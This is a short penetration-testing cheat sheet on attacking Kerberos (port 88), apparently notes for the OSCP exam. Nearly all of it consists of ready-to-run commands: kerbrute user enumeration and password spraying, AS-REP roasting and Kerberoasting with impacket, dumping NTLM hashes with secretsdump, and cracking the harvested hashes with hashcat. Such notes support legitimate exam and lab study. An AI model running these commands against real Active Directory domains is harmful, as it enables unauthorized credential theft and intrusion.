# Kerberos

### Port: 88

## Service Usage

Rare on current OSCP (AD-only boxes). Keep this lean.
Validate users via kerbrute
```bash
kerbrute userenum -d $domain --dc $ip users.txt
```
Password spray via kerbrute
```bash
kerbrute passwordspray -d $domain --dc $ip users.txt 'Spring2026!'
```
Get a TGT if you have creds and a clock-synced box
```bash
impacket-getTGT $domain/$un:$pw
```

AS-REP roast (harvest crackable hashes if pre-auth disabled)
```bash
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass
```

Kerberoast (request SPNs) with creds
```bash
impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip
```

Dump secrets (NTLM hashes) with creds
```bash
impacket-secretsdump $domain/$un:$pw@$ip
```

## AS-REP and Kerberoast

AS-REP roast → crack
```bash
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass -format hashcat > asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

Kerberoast → crack
```bash
impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt
```

Clock skew fix (KRB_AP_ERR_SKEW)
```bash
sudo faketime "$(ntpdate -q $ntp_ip | cut -d ' ' -f 1,2)"
```